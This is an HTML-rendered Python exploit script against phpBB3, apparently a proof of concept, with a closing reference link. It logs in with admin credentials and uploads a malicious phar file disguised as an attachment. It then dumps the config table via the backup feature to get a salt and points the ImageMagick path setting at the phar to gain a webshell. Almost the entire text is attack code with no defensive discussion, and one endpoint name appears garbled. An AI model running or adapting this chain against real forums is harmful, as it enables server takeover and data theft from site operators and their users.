		<p class="cs3A447A38"><span class="cs9FB05234"># coding =utf-8</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from bs4 import BeautifulSoup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">proxies = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import hashlib</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def md5(str):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;m = hashlib.md5()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;m.update(str.encode(&quot;utf8&quot;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return m.hexdigest()</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;target = &quot;http://bugtest.com/phpBB3&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;admin_account = &#39;admin&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;admin_pwd = &#39;123456&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;phar_payload = &#39;payload.phar.zip&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;upfilename = &#39;rai4over.zip&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;username&#39;: admin_account,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;password&#39;: admin_pwd,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;login&#39;: &#39;Login&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;Start logging in to the administrator account&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.post(target + &#39;/ucp.php?mode=login&#39;, data=data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html = rs.text</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (&#39;header-profile dropdown-container&#39; in html) and (&quot;class=\&quot;username-coloured\&quot;&gt;&quot; + admin_account in html):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;OK! The administrator account is successfully logged in&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;No! Login failed . Probably because of the verification code&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;input = soup.find(&#39;input&#39;, attrs={&#39;name&#39;: &#39;sid&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sid = input[&#39;value&#39;]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;file = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;fileupload&#39;: open(phar_payload, &quot;rb&quot;).read()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;: upfilename,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;chunk&#39;: 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;chunks&#39;: 3,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;add_file&#39;: &#39;Add the file&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;real_filename&#39;: &#39;payload.phar.zip&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.post(target + &#39;/posting.php?mode=post&amp;f=2&amp;sid=&#39; + sid, files=file, data=data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;jsonrpc&#39; not in rs.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;Upload fail&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Uploading malicious file successfully&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Admin_Control = target + &#39;/adm/index.php?sid=&#39; + sid</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;Get Administration Control Panel URL </span><span class="cs7FFD2630">：</span><span class="cs9FB05234">&quot; + Admin_Control)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.get(Admin_Control)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html = rs.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;input = soup.find(&#39;input&#39;, attrs={&#39;type&#39;: &#39;password&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;passwd_id = input[&#39;id&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;credential = soup.find(&#39;input&#39;, attrs={&#39;name&#39;: &#39;credential&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;credential = credential[&#39;value&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;username&#39;: admin_account,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;passwd_id: admin_pwd,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;login&#39;: &#39;Login&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;redirect&#39;: &#39;./../adm/index.php&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;credential&#39;: credential</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.post(target + &#39;/adm/index.php?sid=&#39; + sid, data=data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html = rs.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;&lt;title&gt;ACP index&lt;/title&gt;&#39; in html:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Administration Control Panel login successful&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;div = soup.find(&#39;div&#39;, attrs={&#39;id&#39;: &#39;page-header&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sid = div.a[&#39;href&#39;][-32:]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.get(target + &#39;/adm/index.php?i=acp_database&amp;mode=backup&amp;sid=&#39; + sid)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html = rs.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;input = soup.find(&#39;input&#39;, attrs={&#39;name&#39;: &#39;form_token&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;form_token = input[&#39;value&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;input = soup.find(&#39;input&#39;, attrs={&#39;name&#39;: &#39;creation_time&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;creation_time = input[&#39;value&#39;]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = &quot;type=data&amp;method=text&amp;where=download&amp;table%5B%5D=phpbb_config&amp;submit=Submit&amp;creation_time={creation_time}&amp;form_token={form_token}&quot;.format(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;creation_time=creation_time, form_token=form_token)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.post(target + &#39;/adm/index.php?i=acp_database&amp;mode=backup&amp;action=download&amp;sid=&#39; + sid, data=data,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Connection&quot;: &quot;close&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html = rs.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;phpBB Backup Script&#39; in html:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Database download succeeded&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;matchObj = re.search(r&quot;\(&#39;plupload_salt&#39;, &#39;(.*?)&#39;, 0\)&quot;, html, re.M | re.I)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if matchObj:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plupload_salt = matchObj.group(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Get the plupload_salt successfully </span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{plupload_salt}&#39;.format(plupload_salt=plupload_salt))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;Get the plupload_salt failed&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;Database download failed&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;Calculate the name of the phar&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;name = &quot;{plupload_salt}_{md5name}zip.part&quot;.format(plupload_salt=plupload_salt, md5name=md5(upfilename))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.get(target + &#39;/adm/index.php?i=acp_attachmenpartts&amp;mode=attach&amp;sid=&#39; + sid)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html = rs.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html, &quot;html.parser&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;input = soup.find(&#39;input&#39;, attrs={&#39;name&#39;: &#39;form_token&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;form_token = input[&#39;value&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;Get form_token from Attachment settings</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{form_token}&quot;.format(form_token=form_token))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = &quot;config%5Ballow_attachments%5D=1&amp;config%5Ballow_pm_attach%5D=0&amp;config%5Bupload_path%5D=files&amp;config%5Bdisplay_order%5D=0&amp;config%5Battachment_quota%5D=50&amp;attachment_quota=mb&amp;config%5Bmax_filesize%5D=256&amp;max_filesize=kb&amp;config%5Bmax_filesize_pm%5D=256&amp;max_filesize_pm=kb&amp;config%5Bmax_attachments%5D=3&amp;config%5Bmax_attachments_pm%5D=1&amp;config%5Bsecure_downloads%5D=0&amp;config%5Bsecure_allow_deny%5D=1&amp;config%5Bsecure_allow_empty_referer%5D=1&amp;config%5Bcheck_attachment_content%5D=1&amp;config%5Bimg_display_inlined%5D=1&amp;config%5Bimg_create_thumbnail%5D=0&amp;config%5Bimg_max_thumb_width%5D=400&amp;config%5Bimg_min_thumb_filesize%5D=12000&amp;config%5Bimg_imagick%5D={upfile}&amp;config%5Bimg_max_width%5D=0&amp;config%5Bimg_max_height%5D=0&amp;config%5Bimg_link_width%5D=0&amp;config%5Bimg_link_height%5D=0&amp;submit=Submit&amp;ips=&amp;ipexclude=0&amp;creation_time=1552465991&amp;form_token={form_token}&quot;.format(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;form_token=form_token,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;upfile=&#39;phar://../files/plupload/&#39; + name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rs = r.post(target + &#39;/adm/index.php?i=acp_attachments&amp;mode=attach&amp;sid=&#39; + sid, data=data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;Get webshell succeeded&#39;)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/8239#toc-3</span></p></body>
</html>
